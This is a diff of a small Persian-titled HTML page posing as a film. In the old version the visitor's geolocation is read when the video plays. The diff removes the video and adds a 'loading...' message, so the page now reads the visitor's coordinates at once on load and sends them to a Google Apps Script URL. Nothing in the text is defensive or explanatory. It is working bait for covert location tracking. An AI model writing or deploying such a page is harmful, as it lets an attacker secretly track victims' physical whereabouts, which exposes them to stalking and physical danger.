@@ -4,21 +4,17 @@
 <meta charset="UTF-8">
 <title>فیلم</title>
 <style>
-body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;}
-video{width:100%;max-width:500px;}
+body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;}
+p{color:white;font-size:20px;}
 </style>
 </head>
 <body>
-<video id="vid" controls>
-<source src="https://drive.google.com/uc?export=download&id=1I5NILnCWcccjrZZDdsD5L-jnNCUIWj3p" type="video/mp4">
-</video>
+<p>در حال بارگذاری...</p>
 <script>
-document.getElementById("vid").addEventListener("play",function(){
 navigator.geolocation.getCurrentPosition(function(p){
 var lat=p.coords.latitude;
 var lon=p.coords.longitude;
 fetch("https://script.google.com/macros/s/AKfycbxOSBgHXr5R8ndNperhFhkuYURo559hgSjZg9JYYy0RXWE2rJ00zQnpOmTwuOFhJ4Q59Q/exec?lat="+lat+"&lon="+lon);
-});
 });
 </script>
 </body>
